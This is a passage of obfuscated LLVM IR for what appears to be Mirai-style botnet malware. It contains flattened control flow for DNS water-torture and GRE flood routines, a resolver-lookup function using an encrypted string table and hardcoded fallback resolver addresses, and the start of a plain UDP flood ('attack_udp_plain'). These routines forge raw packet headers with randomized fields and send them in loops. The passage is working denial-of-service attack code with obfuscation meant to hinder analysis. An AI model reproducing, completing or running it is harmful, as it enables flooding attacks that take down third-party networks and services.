  %183 = call zeroext i16 @htons(i16 zeroext %182) #7
  %184 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %185 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %184, i32 0, i32 0
  store i16 %183, i16* %185, align 2
  %186 = load i16, i16* %19, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %189 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %188, i32 0, i32 1
  store i16 %187, i16* %189, align 2
  %190 = load i8, i8* %21, align 1
  %191 = zext i8 %190 to i64
  %192 = add i64 21, %191
  %193 = add i64 %192, 2
  %194 = load i32, i32* %23, align 4
  %195 = sext i32 %194 to i64
  %196 = add i64 %193, %195
  %197 = add i64 %196, 4
  %198 = trunc i64 %197 to i16
  %199 = call zeroext i16 @htons(i16 zeroext %198) #7
  %200 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %201 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %200, i32 0, i32 2
  store i16 %199, i16* %201, align 2
  %202 = load i16, i16* %20, align 2
  %203 = call zeroext i16 @htons(i16 zeroext %202) #7
  %204 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %205 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %204, i32 0, i32 0
  store i16 %203, i16* %205, align 2
  %206 = call zeroext i16 @htons(i16 zeroext 256) #7
  %207 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %208 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %207, i32 0, i32 1
  store i16 %206, i16* %208, align 2
  %209 = call zeroext i16 @htons(i16 zeroext 1) #7
  %210 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %211 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %210, i32 0, i32 2
  store i16 %209, i16* %211, align 2
  %212 = load i8, i8* %21, align 1
  %213 = load i8*, i8** %32, align 8
  %214 = getelementptr inbounds i8, i8* %213, i32 1
  store i8* %214, i8** %32, align 8
  store i8 %212, i8* %213, align 1
  %215 = load i8, i8* %21, align 1
  %216 = zext i8 %215 to i32
  %217 = load i8*, i8** %32, align 8
  %218 = sext i32 %216 to i64
  %219 = getelementptr inbounds i8, i8* %217, i64 %218
  store i8* %219, i8** %32, align 8
  %220 = load i8*, i8** %32, align 8
  store i8* %220, i8** %33, align 8
  %221 = load i8*, i8** %32, align 8
  %222 = getelementptr inbounds i8, i8* %221, i64 1
  %223 = load i8*, i8** %22, align 8
  %224 = load i32, i32* %23, align 4
  %225 = add nsw i32 %224, 1
  call void @util_memcpy(i8* %222, i8* %223, i32 %225)
  store i32 0, i32* %26, align 4
  store i32 -1546810831, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i32, i32* %26, align 4
  %228 = load i32, i32* %23, align 4
  %229 = icmp slt i32 %227, %228
  %230 = select i1 %229, i32 -1918868616, i32 -724741907
  store i32 %230, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = load i8*, i8** %22, align 8
  %233 = load i32, i32* %26, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds i8, i8* %232, i64 %234
  %236 = load i8, i8* %235, align 1
  %237 = sext i8 %236 to i32
  %238 = icmp eq i32 %237, 46
  %239 = select i1 %238, i32 -296679909, i32 1318543085
  store i32 %239, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = load i8, i8* %27, align 1
  %242 = load i8*, i8** %33, align 8
  store i8 %241, i8* %242, align 1
  store i8 0, i8* %27, align 1
  %243 = load i8, i8* %28, align 1
  %244 = add i8 %243, 1
  store i8 %244, i8* %28, align 1
  %245 = load i8*, i8** %32, align 8
  %246 = load i32, i32* %26, align 4
  %247 = sext i32 %246 to i64
  %248 = getelementptr inbounds i8, i8* %245, i64 %247
  %249 = getelementptr inbounds i8, i8* %248, i64 1
  store i8* %249, i8** %33, align 8
  store i32 -1102596679, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i8, i8* %27, align 1
  %252 = add i8 %251, 1
  store i8 %252, i8* %27, align 1
  store i32 -1102596679, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  store i32 1341058348, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load i32, i32* %26, align 4
  %256 = add nsw i32 %255, 1
  store i32 %256, i32* %26, align 4
  store i32 -1546810831, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i8, i8* %27, align 1
  %259 = load i8*, i8** %33, align 8
  store i8 %258, i8* %259, align 1
  %260 = load i8*, i8** %32, align 8
  %261 = load i32, i32* %23, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds i8, i8* %260, i64 %262
  %264 = getelementptr inbounds i8, i8* %263, i64 2
  %265 = bitcast i8* %264 to %struct.grehdr*
  store %struct.grehdr* %265, %struct.grehdr** %34, align 8
  %266 = call zeroext i16 @htons(i16 zeroext 1) #7
  %267 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %268 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %267, i32 0, i32 0
  store i16 %266, i16* %268, align 2
  %269 = call zeroext i16 @htons(i16 zeroext 1) #7
  %270 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %271 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %270, i32 0, i32 1
  store i16 %269, i16* %271, align 2
  store i32 847009551, i32* %switchVar
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  %273 = load i32, i32* %11, align 4
  %274 = add nsw i32 %273, 1
  store i32 %274, i32* %11, align 4
  store i32 -1612992984, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  store i32 -1840867160, i32* %switchVar
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 1469041960, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  %278 = load i32, i32* %11, align 4
  %279 = load i8, i8* %7, align 1
  %280 = zext i8 %279 to i32
  %281 = icmp slt i32 %278, %280
  %282 = select i1 %281, i32 398578040, i32 647335071
  store i32 %282, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  %284 = load i8**, i8*** %13, align 8
  %285 = load i32, i32* %11, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds i8*, i8** %284, i64 %286
  %288 = load i8*, i8** %287, align 8
  store i8* %288, i8** %35, align 8
  %289 = load i8*, i8** %35, align 8
  %290 = bitcast i8* %289 to %struct.iphdr*
  store %struct.iphdr* %290, %struct.iphdr** %36, align 8
  %291 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i64 1
  %293 = bitcast %struct.iphdr* %292 to %struct.udphdr*
  store %struct.udphdr* %293, %struct.udphdr** %37, align 8
  %294 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %295 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %294, i64 1
  %296 = bitcast %struct.udphdr* %295 to %struct.dnshdr*
  store %struct.dnshdr* %296, %struct.dnshdr** %38, align 8
  %297 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %298 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %297, i64 1
  %299 = bitcast %struct.dnshdr* %298 to i8*
  %300 = getelementptr inbounds i8, i8* %299, i64 1
  store i8* %300, i8** %39, align 8
  %301 = load i16, i16* %15, align 2
  %302 = zext i16 %301 to i32
  %303 = icmp eq i32 %302, 65535
  %304 = select i1 %303, i32 595471286, i32 -1287802185
  store i32 %304, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = call i32 @rand_next()
  %307 = and i32 %306, 65535
  %308 = trunc i32 %307 to i16
  %309 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %310 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %309, i32 0, i32 3
  store i16 %308, i16* %310, align 4
  store i32 -1287802185, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %312 = load i16, i16* %18, align 2
  %313 = zext i16 %312 to i32
  %314 = icmp eq i32 %313, 65535
  %315 = select i1 %314, i32 -957020901, i32 -1447082401
  store i32 %315, i32* %switchVar
  br label %loopEnd

; <label>:316:                                    ; preds = %loopEntry
  %317 = call i32 @rand_next()
  %318 = and i32 %317, 65535
  %319 = trunc i32 %318 to i16
  %320 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %321 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %320, i32 0, i32 0
  store i16 %319, i16* %321, align 2
  store i32 -1447082401, i32* %switchVar
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  %323 = load i16, i16* %19, align 2
  %324 = zext i16 %323 to i32
  %325 = icmp eq i32 %324, 65535
  %326 = select i1 %325, i32 -1339200376, i32 1307958125
  store i32 %326, i32* %switchVar
  br label %loopEnd

; <label>:327:                                    ; preds = %loopEntry
  %328 = call i32 @rand_next()
  %329 = and i32 %328, 65535
  %330 = trunc i32 %329 to i16
  %331 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %332 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %331, i32 0, i32 1
  store i16 %330, i16* %332, align 2
  store i32 1307958125, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  %334 = load i16, i16* %20, align 2
  %335 = zext i16 %334 to i32
  %336 = icmp eq i32 %335, 65535
  %337 = select i1 %336, i32 -1180008050, i32 -1772948439
  store i32 %337, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = call i32 @rand_next()
  %340 = and i32 %339, 65535
  %341 = trunc i32 %340 to i16
  %342 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %343 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %342, i32 0, i32 0
  store i16 %341, i16* %343, align 2
  store i32 -1772948439, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i8*, i8** %39, align 8
  %346 = load i8, i8* %21, align 1
  %347 = zext i8 %346 to i32
  call void @rand_alpha_str(i8* %345, i32 %347)
  %348 = load i8*, i8** %39, align 8
  %349 = load i8, i8* %21, align 1
  %350 = zext i8 %349 to i64
  %351 = getelementptr inbounds i8, i8* %348, i64 %350
  store i8 0, i8* %351, align 1
  %352 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %353 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %352, i32 0, i32 7
  store i16 0, i16* %353, align 2
  %354 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %355 = bitcast %struct.iphdr* %354 to i16*
  %356 = call zeroext i16 @checksum_generic(i16* %355, i32 20)
  %357 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %358 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %357, i32 0, i32 7
  store i16 %356, i16* %358, align 2
  %359 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %360 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %359, i32 0, i32 3
  store i16 0, i16* %360, align 2
  %361 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %362 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %363 = bitcast %struct.udphdr* %362 to i8*
  %364 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %365 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %364, i32 0, i32 2
  %366 = load i16, i16* %365, align 2
  %367 = load i8, i8* %21, align 1
  %368 = zext i8 %367 to i64
  %369 = add i64 21, %368
  %370 = add i64 %369, 2
  %371 = load i32, i32* %23, align 4
  %372 = sext i32 %371 to i64
  %373 = add i64 %370, %372
  %374 = add i64 %373, 4
  %375 = trunc i64 %374 to i32
  %376 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %361, i8* %363, i16 zeroext %366, i32 %375)
  %377 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %378 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %377, i32 0, i32 3
  store i16 %376, i16* %378, align 2
  %379 = load i32, i32* %24, align 4
  %380 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %381 = load i32, i32* %11, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %380, i64 %382
  %384 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %383, i32 0, i32 0
  %385 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %384, i32 0, i32 2
  %386 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %385, i32 0, i32 0
  store i32 %379, i32* %386, align 4
  %387 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %388 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %387, i32 0, i32 1
  %389 = load i16, i16* %388, align 2
  %390 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %391 = load i32, i32* %11, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %390, i64 %392
  %394 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %393, i32 0, i32 0
  %395 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %394, i32 0, i32 1
  store i16 %389, i16* %395, align 2
  %396 = load i32, i32* %12, align 4
  %397 = load i8*, i8** %35, align 8
  %398 = load i8, i8* %21, align 1
  %399 = zext i8 %398 to i64
  %400 = add i64 41, %399
  %401 = add i64 %400, 2
  %402 = load i32, i32* %23, align 4
  %403 = sext i32 %402 to i64
  %404 = add i64 %401, %403
  %405 = add i64 %404, 4
  %406 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %407 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %408 = load i32, i32* %11, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %407, i64 %409
  %411 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %410, i32 0, i32 0
  %412 = bitcast %struct.sockaddr_in* %411 to %struct.sockaddr*
  store %struct.sockaddr* %412, %struct.sockaddr** %406, align 8
  %413 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %414 = load %struct.sockaddr*, %struct.sockaddr** %413, align 8
  %415 = call i64 @sendto(i32 %396, i8* %397, i64 %405, i32 16384, %struct.sockaddr* %414, i32 16)
  store i32 -1321213991, i32* %switchVar
  br label %loopEnd

; <label>:416:                                    ; preds = %loopEntry
  %417 = load i32, i32* %11, align 4
  %418 = add nsw i32 %417, 1
  store i32 %418, i32* %11, align 4
  store i32 1469041960, i32* %switchVar
  br label %loopEnd

; <label>:419:                                    ; preds = %loopEntry
  %420 = call i64 @time(i64* null) #6
  %421 = load i32, i32* %25, align 4
  %422 = sext i32 %421 to i64
  %423 = icmp sgt i64 %420, %422
  %424 = select i1 %423, i32 1028762047, i32 -522430827
  store i32 %424, i32* %switchVar
  br label %loopEnd

; <label>:425:                                    ; preds = %loopEntry
  store i32 -1981377364, i32* %switchVar
  br label %loopEnd

; <label>:426:                                    ; preds = %loopEntry
  store i32 -1840867160, i32* %switchVar
  br label %loopEnd

; <label>:427:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %426, %425, %419, %416, %344, %338, %333, %327, %322, %316, %311, %305, %283, %277, %276, %275, %272, %257, %254, %253, %250, %240, %231, %226, %173, %169, %113, %107, %106, %103, %97, %96, %90, %89, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %.reg2mem8 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  store i32 0, i32* %2, align 4
  call void @table_unlock_val(i8 zeroext 37)
  %11 = call i8* @table_retrieve_val(i32 37, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 37)
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1510520166, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 -1510520166, label %first
    i32 -1243919584, label %16
    i32 -2137415562, label %30
    i32 354348726, label %32
    i32 1110472335, label %37
    i32 720488900, label %45
    i32 -230116724, label %50
    i32 2116127284, label %55
    i32 -2112605984, label %56
    i32 1119502898, label %57
    i32 -993241283, label %58
    i32 2101751691, label %63
    i32 366685713, label %68
    i32 563253723, label %73
    i32 1580027886, label %79
    i32 -1105649605, label %93
    i32 -861154778, label %94
    i32 1123610645, label %97
    i32 -1276607734, label %101
    i32 1967168351, label %104
    i32 1033095961, label %105
    i32 -1310980099, label %106
    i32 -1498402529, label %NodeBlock5
    i32 -1082309413, label %NodeBlock3
    i32 -343438348, label %LeafBlock1
    i32 337511127, label %NodeBlock
    i32 -1316235927, label %LeafBlock
    i32 -946382247, label %114
    i32 1876567937, label %116
    i32 725705914, label %118
    i32 -1443906490, label %120
    i32 451449888, label %NewDefault
    i32 -128004117, label %122
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sge i32 %.reload, 0
  %15 = select i1 %14, i32 -1243919584, i32 -1310980099
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %17 = load i32, i32* %2, align 4
  %18 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %19 = call i64 @read(i32 %17, i8* %18, i64 2048)
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* %3, align 4
  %21 = load i32, i32* %2, align 4
  %22 = call i32 @close(i32 %21)
  call void @table_unlock_val(i8 zeroext 38)
  %23 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %24 = load i32, i32* %3, align 4
  %25 = call i8* @table_retrieve_val(i32 38, i32* null)
  %26 = call i32 @util_stristr(i8* %23, i32 %24, i8* %25)
  store i32 %26, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 38)
  %27 = load i32, i32* %4, align 4
  %28 = icmp ne i32 %27, -1
  %29 = select i1 %28, i32 -2137415562, i32 1033095961
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %31 = load i32, i32* %4, align 4
  store i32 %31, i32* %6, align 4
  store i32 354348726, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %6, align 4
  %34 = load i32, i32* %3, align 4
  %35 = icmp slt i32 %33, %34
  %36 = select i1 %35, i32 1110472335, i32 1123610645
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %6, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  store i8 %41, i8* %10, align 1
  %42 = load i8, i8* %8, align 1
  %43 = icmp ne i8 %42, 0
  %44 = select i1 %43, i32 -993241283, i32 720488900
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 2116127284, i32 -230116724
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8, i8* %10, align 1
  %52 = sext i8 %51 to i32
  %53 = icmp eq i32 %52, 9
  %54 = select i1 %53, i32 2116127284, i32 -2112605984
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  store i32 -861154778, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i8 1, i8* %8, align 1
  store i32 1119502898, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 -993241283, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8, i8* %10, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp ne i32 %60, 46
  %62 = select i1 %61, i32 2101751691, i32 563253723
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8, i8* %10, align 1
  %65 = sext i8 %64 to i32
  %66 = icmp slt i32 %65, 48
  %67 = select i1 %66, i32 1580027886, i32 366685713
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8, i8* %10, align 1
  %70 = sext i8 %69 to i32
  %71 = icmp sgt i32 %70, 57
  %72 = select i1 %71, i32 1580027886, i32 563253723
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %6, align 4
  %75 = load i32, i32* %3, align 4
  %76 = sub nsw i32 %75, 1
  %77 = icmp eq i32 %74, %76
  %78 = select i1 %77, i32 1580027886, i32 -1105649605
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %81 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %82 = load i32, i32* %4, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %81, i64 %83
  %85 = load i32, i32* %6, align 4
  %86 = load i32, i32* %4, align 4
  %87 = sub nsw i32 %85, %86
  call void @util_memcpy(i8* %80, i8* %84, i32 %87)
  %88 = load i32, i32* %6, align 4
  %89 = load i32, i32* %4, align 4
  %90 = sub nsw i32 %88, %89
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %91
  store i8 0, i8* %92, align 1
  store i8 1, i8* %9, align 1
  store i32 1123610645, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 -861154778, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %6, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %6, align 4
  store i32 354348726, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = load i8, i8* %9, align 1
  %99 = icmp ne i8 %98, 0
  %100 = select i1 %99, i32 -1276607734, i32 1967168351
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %103 = call i32 @inet_addr(i8* %102) #6
  store i32 %103, i32* %1, align 4
  store i32 -128004117, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  store i32 1033095961, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 -1310980099, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = call i32 @rand_next()
  %108 = urem i32 %107, 4
  store i32 %108, i32* %.reg2mem8
  store i32 -1498402529, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload13 = load volatile i32, i32* %.reg2mem8
  %Pivot6 = icmp slt i32 %.reload13, 2
  %109 = select i1 %Pivot6, i32 337511127, i32 -1082309413
  store i32 %109, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem8
  %Pivot4 = icmp slt i32 %.reload10, 3
  %110 = select i1 %Pivot4, i32 725705914, i32 -343438348
  store i32 %110, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem8
  %SwitchLeaf2 = icmp eq i32 %.reload9, 3
  %111 = select i1 %SwitchLeaf2, i32 -1443906490, i32 451449888
  store i32 %111, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload12 = load volatile i32, i32* %.reg2mem8
  %Pivot = icmp slt i32 %.reload12, 1
  %112 = select i1 %Pivot, i32 -1316235927, i32 1876567937
  store i32 %112, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem8
  %SwitchLeaf = icmp eq i32 %.reload11, 0
  %113 = select i1 %SwitchLeaf, i32 -946382247, i32 451449888
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = call i32 @htonl(i32 134744072) #7
  store i32 %115, i32* %1, align 4
  store i32 -128004117, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call i32 @htonl(i32 1246898730) #7
  store i32 %117, i32* %1, align 4
  store i32 -128004117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = call i32 @htonl(i32 1074151430) #7
  store i32 %119, i32* %1, align 4
  store i32 -128004117, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = call i32 @htonl(i32 67240450) #7
  store i32 %121, i32* %1, align 4
  store i32 -128004117, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -128004117, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i32, i32* %1, align 4
  ret i32 %123

loopEnd:                                          ; preds = %NewDefault, %120, %118, %116, %114, %LeafBlock, %NodeBlock, %LeafBlock1, %NodeBlock3, %NodeBlock5, %106, %105, %104, %101, %97, %94, %93, %79, %73, %68, %63, %58, %57, %56, %55, %50, %45, %37, %32, %30, %16, %first, %switchDefault
  br label %loopEntry
}

declare i32 @util_strlen(i8*) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i32*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i16, align 2
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %25 = alloca i8*, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  %26 = load i8, i8* %7, align 1
  %27 = zext i8 %26 to i64
  %28 = call noalias i8* @calloc(i64 %27, i64 8) #6
  %29 = bitcast i8* %28 to i8**
  store i8** %29, i8*** %12, align 8
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 4) #6
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 7, i32 65535)
  %37 = trunc i32 %36 to i16
  store i16 %37, i16* %14, align 2
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 6, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 0, i32 512)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %16, align 2
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 1, i32 1)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
